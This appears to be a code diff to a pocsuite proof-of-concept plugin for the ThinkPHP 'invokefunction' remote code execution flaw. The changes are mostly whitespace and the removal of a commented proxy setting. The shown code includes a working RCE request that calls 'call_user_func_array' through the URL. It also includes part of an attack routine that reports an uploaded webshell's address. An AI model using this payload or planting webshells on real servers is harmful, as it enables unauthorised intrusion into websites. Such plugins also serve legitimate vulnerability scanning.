@@ -9,6 +9,7 @@ from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
 from collections import OrderedDict
 
+
 class ThinkPHP(POCBase):
     vulID = '1024'
     version = '1'
@@ -36,19 +37,16 @@ class ThinkPHP(POCBase):
             if response.status_code == 200:
                 result['webshell'] = self.url+shell_name
             return self.parse_attack(result)
+
     def _verify(self,verify=True):
             result = {}
-            """
-            proxies = {
-                "http": "http://127.0.0.1:8080"
-            }
-            """
             vul_url = '%s/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=1024' % self.url
             response = req.get(vul_url).content
             if '1024' in response:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
             return self.parse_attack(result)
+
     def parse_attack(self, result):
             output = Output(self)
             if result:
@@ -56,5 +54,6 @@ class ThinkPHP(POCBase):
             else:
                 output.fail("No ... ")
             return output
+
 
 register(ThinkPHP)
